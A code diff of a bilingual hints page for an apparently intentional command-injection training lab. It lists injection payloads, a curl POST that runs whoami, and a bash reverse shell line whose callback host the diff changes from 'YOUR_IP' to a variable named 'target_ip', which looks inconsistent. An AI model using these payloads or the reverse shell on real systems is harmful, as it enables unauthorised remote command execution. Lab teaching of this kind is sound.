@@ -48,7 +48,7 @@ host=127.0.0.1%0aid</pre></li>
       <li>Con curl (el <code>%0a</code> se interpreta como newline en el body):
         <pre>curl -X POST http://TARGET_IP/cmdi/ping \
   -d "host=127.0.0.1%0awhoami"</pre></li>
-      <li>Reverse shell (solo en Easy): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1</code></li>
+      <li>Reverse shell (solo en Easy): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</code></li>
     </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
@@ -78,7 +78,7 @@ host=127.0.0.1%0aid</pre></li>
       <li>With curl (<code>%0a</code> is interpreted as newline in the body):
         <pre>curl -X POST http://TARGET_IP/cmdi/ping \
   -d "host=127.0.0.1%0awhoami"</pre></li>
-      <li>Reverse shell (Easy only): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code></li>
+      <li>Reverse shell (Easy only): <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</code></li>
     </ol>
     <h3>Tools</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
